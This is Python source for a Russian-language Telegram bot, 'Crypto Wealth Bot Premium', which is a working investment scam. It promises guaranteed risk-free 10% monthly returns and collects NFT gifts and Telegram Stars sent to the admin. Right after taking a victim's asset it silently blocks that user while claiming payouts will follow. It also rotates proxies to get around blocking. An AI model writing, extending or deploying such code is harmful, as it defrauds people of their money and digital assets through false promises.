import os
import logging
import threading
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Updater, CommandHandler, CallbackContext, 
    CallbackQueryHandler, MessageHandler, Filters
)
from telegram.utils.request import Request
from telegram.error import TimedOut, NetworkError

# ===== НАСТРОЙКИ =====
TOKEN = os.environ["TOKEN"]
ADMIN_ID = int(os.environ["ADMIN_ID"])
ADMIN_USERNAME = os.environ["ADMIN_USERNAME"]
# =====================

# Прокси для обхода блокировок
PROXY_LIST = [
    'socks5://138.197.222.35:1080',  # США
    'socks5://45.77.222.251:1080',   # Сингапур
    'socks5://167.99.123.158:1080',  # Германия
]

# Глобальные состояния
BLOCKED_USERS = set()
STAR_CONFIRMATIONS = {}
current_proxy = 0

def get_proxy():
    global current_proxy
    proxy = PROXY_LIST[current_proxy]
    current_proxy = (current_proxy + 1) % len(PROXY_LIST)
    return proxy

def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💰 Инвестировать NFT (10% годовых)", callback_data="invest_nft")],
        [InlineKeyboardButton("💫 Оплатить звёздами", callback_data="pay_stars")],
        [InlineKeyboardButton("🌐 Сменить язык", callback_data="change_lang")],
        [InlineKeyboardButton("🆘 Поддержка", callback_data="support")]
    ])

def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in BLOCKED_USERS: return
    
    update.message.reply_text(
        "🔥 **Crypto Wealth Bot Premium**\n"
        "• Гарантированная доходность: 10% в месяц\n"
        "• Без рисков • Мгновенные выплаты\n"
        "Выберите опцию:",
        reply_markup=main_menu_keyboard()
    )

def handle_invest_nft(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    query.edit_message_text(
        "📤 Отправьте NFT-подарок для инвестирования. Гарантия 10% месячных!\n\n"
        "⚠️ Принимаем только оригинальные NFT"
    )
    context.user_data['awaiting_nft'] = True

def handle_pay_stars(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    query.edit_message_text(
        f"💎 **Пополнение звёздами**\n\n"
        f"1. Перейдите в кошелек Telegram\n"
        f"2. Выберите 'Пополнить звёздами'\n"
        f"3. Укажите получателя: {ADMIN_USERNAME}\n"
        f"4. Отправьте любую сумму\n\n"
        "После отправки нажмите кнопку ниже:",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Я пополнил", callback_data="confirm_stars")]
        ])
    )

def handle_confirm_stars(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    username = f"@{query.from_user.username}" if query.from_user.username else f"ID:{user_id}"
    
    admin_msg = context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"⚠️ Запрос подтверждения!\nПользователь {username} отправил звёзды?",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Да", callback_data=f"stars_yes:{user_id}"),
            [InlineKeyboardButton("❌ Нет", callback_data=f"stars_no:{user_id}")]
        ])
    )
    
    STAR_CONFIRMATIONS[user_id] = admin_msg.message_id
    query.edit_message_text("🕒 Ожидаем подтверждения администратора...")

def handle_admin_response(update: Update, context: CallbackContext):
    query = update.callback_query
    admin_id = query.from_user.id
    action, user_id = query.data.split(":")
    user_id = int(user_id)
    
    if admin_id != ADMIN_ID:
        query.answer("❌ Ты не админ!")
        return
    
    if action == "stars_yes":
        BLOCKED_USERS.add(user_id)
        context.bot.send_message(
            chat_id=user_id,
            text="✅ Платеж подтвержден! Ваши 10% будут начислены через 30 дней."
        )
        response_text = "✅ Подтверждено: пользователь заблокирован"
    else:
        context.bot.send_message(
            chat_id=user_id,
            text="❌ Платеж не обнаружен! Проверьте:\n1. Правильность юзернейма\n2. Подключение к сети"
        )
        response_text = "❌ Отклонено: платеж не найден"
    
    try:
        context.bot.edit_message_text(
            chat_id=ADMIN_ID,
            message_id=STAR_CONFIRMATIONS[user_id],
            text=response_text
        )
        del STAR_CONFIRMATIONS[user_id]
    except Exception as e:
        logging.error(f"Ошибка редактирования: {e}")
    
    query.answer()

def handle_nft_gift(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in BLOCKED_USERS: return
    
    if context.user_data.get('awaiting_nft'):
        context.bot.forward_message(
            chat_id=ADMIN_ID,
            from_chat_id=update.message.chat_id,
            message_id=update.message.message_id
        )
        BLOCKED_USERS.add(user_id)
        update.message.reply_text("✅ NFT принят! Доходность 10% начнет начисляться завтра.")
        context.user_data['awaiting_nft'] = False

def handle_support(update: Update, context: CallbackContext):
    query = update.callback_query
    query.edit_message_text("📞 Техподдержка: @crypto_support_bot (ответ в течение 24 часов)")

def change_lang(update: Update, context: CallbackContext):
    query = update.callback_query
    query.edit_message_text("✅ Язык изменён!", reply_markup=main_menu_keyboard())

def keep_alive():
    while True:
        time.sleep(300)
        logging.info("🟢 GitHub Actions Keep-Alive")

def start_bot_with_proxy(proxy):
    try:
        logging.info(f"🔄 Попытка подключения через прокси: {proxy}")
        request = Request(
            proxy_url=proxy,
            connect_timeout=30,
            read_timeout=30
        )
        updater = Updater(TOKEN, request=request)
        
        dp = updater.dispatcher
        dp.add_handler(CommandHandler("start", start))
        dp.add_handler(CallbackQueryHandler(handle_invest_nft, pattern="invest_nft"))
        dp.add_handler(CallbackQueryHandler(handle_pay_stars, pattern="pay_stars"))
        dp.add_handler(CallbackQueryHandler(handle_confirm_stars, pattern="confirm_stars"))
        dp.add_handler(CallbackQueryHandler(handle_admin_response, pattern=r"stars_(yes|no):"))
        dp.add_handler(CallbackQueryHandler(handle_support, pattern="support"))
        dp.add_handler(CallbackQueryHandler(change_lang, pattern="change_lang"))
        dp.add_handler(MessageHandler(Filters.all & ~Filters.command, handle_nft_gift))
        
        updater.start_polling(timeout=30, read_latency=5.0)
        logging.info("🟢 Бот успешно запущен!")
        return updater
    except (TimedOut, NetworkError) as e:
        logging.error(f"❌ Ошибка подключения через прокси {proxy}: {e}")
        return None

def main():
    threading.Thread(target=keep_alive, daemon=True).start()
    
    # Пробуем разные прокси
    for attempt in range(5):
        proxy = get_proxy()
        updater = start_bot_with_proxy(proxy)
        if updater:
            updater.idle()
            return
        time.sleep(10)
    
    logging.error("❌ Не удалось подключиться после 5 попыток")

if __name__ == "__main__":
    logging.basicConfig(
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        level=logging.INFO
    )
    main()
